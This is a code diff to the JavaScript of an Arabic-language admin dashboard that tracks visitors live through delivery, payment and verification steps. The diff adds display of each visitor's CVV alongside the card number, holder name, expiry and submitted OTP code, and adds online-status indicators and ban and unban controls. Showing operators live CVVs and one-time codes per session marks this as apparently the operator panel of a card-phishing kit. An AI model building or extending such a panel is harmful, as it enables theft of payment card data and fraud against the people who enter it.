@@ -93,8 +93,12 @@ function initAdminSocket() {
     });
 
     socket.on('visitor:offline', (data) => {
-      markVisitorOffline(data.sessionId);
+      updateVisitorStatus(data.sessionId, false);
       updateStats();
+    });
+
+    socket.on('visitor:online', (data) => {
+      updateVisitorStatus(data.sessionId, true);
     });
 
     // Form submissions
@@ -115,6 +119,20 @@ function initAdminSocket() {
       updateStats();
       updateVisitorCard(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
     });
+
+    // Ban list update event
+    socket.on('ban:listUpdate', () => {
+      loadBannedUsers();
+    });
+
+    socket.on('user:unbanned', (data) => {
+      if (data.success) {
+        showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
+        loadBannedUsers();
+      } else {
+        showNotification('خطأ', data.message || 'حدث خطأ', 'error');
+      }
+    });
   });
 }
 
@@ -129,10 +147,10 @@ function showNotification(title, message, type = 'info') {
   const notification = document.createElement('div');
   notification.className = 'notification';
   notification.innerHTML = `
-    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : 'ℹ'}</span>
+    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : type === 'error' ? '✕' : 'ℹ'}</span>
     <div>
       <div style="font-weight:600;">${title}</div>
-      <div style="font-size:0.85rem;color:#666;">${message}</div>
+      ${message ? `<div style="font-size:0.85rem;color:#666;">${message}</div>` : ''}
     </div>
   `;
   document.body.appendChild(notification);
@@ -161,6 +179,7 @@ function createVisitorCard(visitor) {
   const verification = visitor.verification_data || {};
   const country = visitor.country || 'غير معروف';
   const page = visitor.current_page || 'home';
+  const isOnline = visitor.is_online;
   
   const hasOTP = verification.otp || verification.verificationData?.otp;
   const otpValue = hasOTP ? (verification.otp || verification.verificationData?.otp) : null;
@@ -172,13 +191,10 @@ function createVisitorCard(visitor) {
     { key: 'verification_submitted', label: 'التحقق', icon: '🔐' }
   ];
   
-  const progressHTML = steps.map(step => {
+  const progressHTML = steps.map((step, index) => {
     const isCompleted = visitor[step.key];
-    const isActive = !isCompleted && (
-      (step.key === 'form_submitted' && !visitor.form_submitted) ||
-      (step.key === 'payment_submitted' && visitor.form_submitted && !visitor.payment_submitted) ||
-      (step.key === 'verification_submitted' && visitor.payment_submitted && !visitor.verification_submitted)
-    );
+    const prevCompleted = index === 0 || visitor[steps[index - 1].key];
+    const isActive = !isCompleted && prevCompleted;
     const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
     return `
       <div class="progress-step ${statusClass}">
@@ -206,15 +222,16 @@ function createVisitorCard(visitor) {
     `;
   }
   
-  // Payment section
+  // Payment section with CVV
   if (Object.keys(payment).length > 0) {
     const cardNum = payment.cardNumber || payment.card_number || '';
     cardBody += `
       <div class="card-section payment-section">
         <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
         ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${cardNum}</span></div>` : ''}
-        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${payment.expiry}</span></div>` : ''}
         ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${payment.cardHolder}</span></div>` : ''}
+        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${payment.expiry}</span></div>` : ''}
+        ${payment.cvv ? `<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">${payment.cvv}</span></div>` : ''}
       </div>
     `;
   }
@@ -239,13 +256,28 @@ function createVisitorCard(visitor) {
     `;
   }
   
+  // Status indicator
+  const statusHTML = isOnline ? `
+    <div class="card-status">
+      <span class="dot"></span>
+      <span>متصل الآن</span>
+    </div>
+  ` : `
+    <div class="card-status" style="color:#ccc;">
+      <span style="color:#ccc;">○</span>
+      <span style="color:#999;">غير متصل</span>
+    </div>
+  `;
+  
+  // Header background changes based on online status
+  const headerStyle = isOnline 
+    ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);'
+    : 'background: linear-gradient(135deg, #6b7280 0%, #9ca3af 100%);';
+  
   return `
-    <div class="visitor-card" data-session="${visitor.session_id}">
-      <div class="card-header">
-        <div class="card-status">
-          <span class="dot"></span>
-          <span>متصل الآن</span>
-        </div>
+    <div class="visitor-card" data-session="${visitor.session_id}" data-online="${isOnline}">
+      <div class="card-header" style="${headerStyle}">
+        ${statusHTML}
         <div class="card-country">
           <span>${getCountryFlag(visitor.country_code)}</span>
           <span>${country}</span>
@@ -262,7 +294,7 @@ function createVisitorCard(visitor) {
       </div>
       
       <div class="card-actions">
-        <button class="btn btn-danger btn-sm" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address}')">
+        <button class="btn btn-danger btn-sm" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address || ''}')">
           🚫 حظر
         </button>
       </div>
@@ -276,18 +308,20 @@ function updateVisitorsList() {
   socket.once('visitors:update', (data) => {
     const grid = document.getElementById('visitorsGrid');
     const countEl = document.getElementById('onlineCount');
+    const totalCountEl = document.getElementById('totalCount');
     if (!grid) return;
     
-    if (countEl) {
-      countEl.textContent = data.visitors.length;
-    }
+    const onlineCount = data.visitors.filter(v => v.is_online).length;
+    
+    if (countEl) countEl.textContent = onlineCount;
+    if (totalCountEl) totalCountEl.textContent = data.visitors.length;
     
     if (data.visitors.length === 0) {
       grid.innerHTML = `
         <div class="empty-state">
           <span>👥</span>
-          <h3>لا يوجد زوار متصلين</h3>
-          <p>الزوار المتصلون حالياً سيظهرون هنا</p>
+          <h3>لا يوجد زوار</h3>
+          <p>الزوار سيظهرون هنا</p>
         </div>
       `;
       return;
@@ -302,89 +336,37 @@ function updateVisitorPage(sessionId, page) {
   if (card) {
     const pageEl = card.querySelector('.card-page');
     if (pageEl) pageEl.textContent = getPageName(page);
+  }
+}
+
+function updateVisitorStatus(sessionId, isOnline) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (card) {
+    card.setAttribute('data-online', isOnline);
     
-    // Update progress steps
-    const steps = card.querySelectorAll('.progress-step');
-    if (page === 'delivery' && steps[0]) {
-      steps[0].classList.add('active');
+    const header = card.querySelector('.card-header');
+    const statusEl = card.querySelector('.card-status');
+    
+    if (isOnline) {
+      header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+      if (statusEl) {
+        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+      }
+    } else {
+      header.style.background = 'linear-gradient(135deg, #6b7280 0%, #9ca3af 100%)';
+      if (statusEl) {
+        statusEl.innerHTML = '<span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span>';
+      }
     }
+    
+    // Update counts
+    updateVisitorsList();
   }
 }
 
 function updateVisitorCard(sessionId, data) {
-  let card = document.querySelector(`[data-session="${sessionId}"]`);
-  
-  if (!card) {
-    // Card doesn't exist, refresh the whole list
-    updateVisitorsList();
-    return;
-  }
-  
-  // If delivery data, mark step 1 complete
-  if (data.form_submitted) {
-    const steps = card.querySelectorAll('.progress-step');
-    if (steps[0]) {
-      steps[0].classList.add('completed');
-      steps[0].classList.remove('active');
-      steps[0].querySelector('.step-icon').textContent = '✓';
-    }
-    if (steps[1]) {
-      steps[1].classList.add('active');
-    }
-  }
-  
-  // If payment data, mark step 2 complete
-  if (data.payment_submitted) {
-    const steps = card.querySelectorAll('.progress-step');
-    if (steps[1]) {
-      steps[1].classList.add('completed');
-      steps[1].classList.remove('active');
-      steps[1].querySelector('.step-icon').textContent = '✓';
-    }
-    if (steps[2]) {
-      steps[2].classList.add('active');
-    }
-  }
-  
-  // If verification/OTP, mark step 3 complete and highlight OTP
-  if (data.verification_submitted) {
-    const steps = card.querySelectorAll('.progress-step');
-    if (steps[2]) {
-      steps[2].classList.add('completed');
-      steps[2].classList.remove('active');
-      steps[2].querySelector('.step-icon').textContent = '✓';
-    }
-    
-    // Add OTP highlight
-    const verificationData = data.verification_data || data;
-    if (verificationData.otp) {
-      const cardBody = card.querySelector('.card-body');
-      const otpSection = cardBody.querySelector('.otp-section');
-      if (!otpSection) {
-        cardBody.insertAdjacentHTML('beforeend', `
-          <div class="otp-section">
-            <div class="section-title"><span>🔐</span> رمز التحقق (OTP)</div>
-            <div class="otp-value">${verificationData.otp}</div>
-          </div>
-        `);
-      }
-    }
-  }
-  
-  // Refresh card completely for full data update
+  // Refresh the entire list for simplicity
   updateVisitorsList();
-}
-
-function markVisitorOffline(sessionId) {
-  const card = document.querySelector(`[data-session="${sessionId}"]`);
-  if (card) {
-    const statusEl = card.querySelector('.card-status');
-    if (statusEl) {
-      statusEl.innerHTML = '<span style="color:#aaa;">○ غير متصل</span>';
-    }
-    const dot = card.querySelector('.dot');
-    if (dot) dot.style.background = '#ccc';
-  }
 }
 
 // Stats Functions
@@ -449,21 +431,85 @@ async function adminLogin(username, password) {
   }
 }
 
-// Ban Functions
+// Ban Functions - Direct ban without prompts
 function banVisitor(sessionId, ipAddress) {
-  const reason = prompt('أدخل سبب الحظر:');
-  if (reason === null) return;
-  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):');
+  if (!confirm('هل أنت متأكد من حظر هذا المستخدم؟')) return;
+  
+  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):', 'تم حظرك من الموقع. يرجى التواصل مع الدعم.');
+  if (customMessage === null) return;
   
   if (socket) {
     socket.emit('user:ban', {
       targetSessionId: sessionId || null,
       targetIp: ipAddress || null,
-      reason,
-      customMessage: customMessage || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'
+      reason: 'Banned by admin',
+      customMessage: customMessage || 'تم حظرك من الموقع.'
     });
+    
     showNotification('تم الحظر', 'تم حظر المستخدم بنجاح', 'success');
-    updateVisitorsList();
+    
+    // Remove card from view
+    const card = document.querySelector(`[data-session="${sessionId}"]`);
+    if (card) {
+      card.style.opacity = '0.5';
+      card.style.pointerEvents = 'none';
+    }
+  }
+}
+
+// Load Banned Users List
+async function loadBannedUsers() {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/admin/banned`);
+    const data = await response.json();
+    const tbody = document.getElementById('bannedTableBody');
+    if (!tbody) return;
+    
+    if (!data.banned?.length) {
+      tbody.innerHTML = `<tr><td colspan="4" class="empty-state"><span>✅</span><p>لا يوجد مستخدمين محظورين</p></td></tr>`;
+      return;
+    }
+    
+    tbody.innerHTML = data.banned.map(user => `
+      <tr>
+        <td>${user.id}</td>
+        <td>
+          ${user.session_id ? `<div style="font-size:0.8rem;color:#666;">الجلسة: ${user.session_id.substring(0, 20)}...</div>` : ''}
+          ${user.ip_address ? `<div style="font-size:0.8rem;">IP: ${user.ip_address}</div>` : ''}
+        </td>
+        <td>${user.reason || '-'}</td>
+        <td>
+          <button class="btn btn-success btn-sm" onclick="unbanUser(${user.id})">
+            ✅ فك الحظر
+          </button>
+        </td>
+      </tr>
+    `).join('');
+  } catch (error) {
+    console.error('Error loading banned users:', error);
+  }
+}
+
+// Quick Unban Function
+function unbanUser(banId) {
+  if (!confirm('هل أنت متأكد من فك الحظر؟')) return;
+  
+  if (socket) {
+    socket.emit('user:unban', { banId });
+    showNotification('جاري فك الحظر', '', 'info');
+  } else {
+    // Fallback to API
+    fetch(`${SERVER_URL}/api/admin/banned/${banId}`, { method: 'DELETE' })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          showNotification('تم فك الحظر', '', 'success');
+          loadBannedUsers();
+        }
+      })
+      .catch(err => {
+        showNotification('خطأ', 'حدث خطأ أثناء فك الحظر', 'error');
+      });
   }
 }
 
@@ -477,6 +523,7 @@ function showTab(tabId) {
   if (tabId === 'stats') { updateStats(); }
   else if (tabId === 'tracking') { updateVisitorsList(); }
   else if (tabId === 'products') { loadProducts(); }
+  else if (tabId === 'banned') { loadBannedUsers(); }
   else if (tabId === 'devices') { loadDevices(); }
 }
 
@@ -510,7 +557,7 @@ async function loadProducts() {
     if (!tbody) return;
     
     if (!data.products?.length) {
-      tbody.innerHTML = `<tr><td colspan="6" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="5" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
       return;
     }
     
@@ -518,7 +565,6 @@ async function loadProducts() {
       <tr>
         <td>${product.id}</td>
         <td>${product.name_ar}</td>
-        <td>${product.name_en || '-'}</td>
         <td>${product.price} ر.ع</td>
         <td>${product.stock || 0}</td>
         <td>
@@ -628,6 +674,8 @@ document.addEventListener('DOMContentLoaded', async () => {
 window.showTab = showTab;
 window.toggleSound = toggleSound;
 window.banVisitor = banVisitor;
+window.unbanUser = unbanUser;
+window.loadBannedUsers = loadBannedUsers;
 window.deleteProduct = deleteProduct;
 window.logoutDevice = logoutDevice;
 window.logoutAllDevices = logoutAllDevices;
